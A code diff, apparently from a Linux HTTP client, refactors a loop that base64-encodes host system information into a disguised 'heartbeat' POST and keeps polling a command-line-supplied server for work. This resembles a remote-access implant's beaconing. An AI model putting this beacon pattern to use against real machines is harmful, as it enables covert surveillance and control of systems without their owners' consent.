@@ -26,22 +26,12 @@
 #include "operations.h"
 #include <thread>
 #include <sharedResourceManager.h>
-
+#include "systemInformation.h"
+#include "json.h"
+#include "stringUtil.h"
 
 #define NUM_OF_ARGS 3
 
-
-std::wstring createHeartbeatRequest(const std::wstring &sysInfoInJson){
-
-    std::string dataBase64 = base64_encode((unsigned char*)ws2s(sysInfoInJson).c_str(), sysInfoInJson.length());
-    std::wstringstream contentLengthStream;
-    contentLengthStream << dataBase64.length();
-    std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?HeartBeatSignal\r\nAccept-Encoding: identity\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nContent-Type: application/octet-stream\r\n";  
-    request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";
-    request += L"Connection: close\r\n"; 
-    request += L"\r\n" + s2ws(dataBase64);
-    return request;
-}
 
 int main(int argc, char** argv) {
 
@@ -50,25 +40,27 @@ int main(int argc, char** argv) {
         return -1;
     }
 
-    const std::wstring url{ s2ws(argv[1]) };
-    const std::wstring port{ s2ws(argv[2]) };
+    const std::wstring url{ StringUtils::s2ws(argv[1]) };
+    const std::wstring port{ StringUtils::s2ws(argv[2]) };
 
-    if (!isValidPort(ws2s(port))) {
+    if (!isValidPort(StringUtils::ws2s(port))) {
 		return -1;
 	}
-    const std::wstring sysInfo {getSysInfo()};
+
+    const std::wstring sysInfo {JsonUtil::to_json(SysInformation::getSysInfo())};
     SharedResourceManager sharedResources;
     sharedResources.setSysInfoInJson(sysInfo);
     const std::wstring heartbeatRequestToServer {createHeartbeatRequest(sysInfo)}; 
-    std::wstring request { heartbeatRequestToServer }; 
+    std::wstring request; //{ heartbeatRequestToServer }; 
     std::wstring replyFromServerInJson;
     std::wstring response;       
     HttpPost httpPost;
     
-    while(true){
+    while(true){        
         if(sharedResources.isResponseAvailable()){      // If there is a response to be send to the server
             request = sharedResources.popResponse();
             replyFromServerInJson = httpPost(url, port, request);
+            request.clear();
         }
         else {                                          // else, send alive signal to server
             replyFromServerInJson = httpPost(url, port, heartbeatRequestToServer);
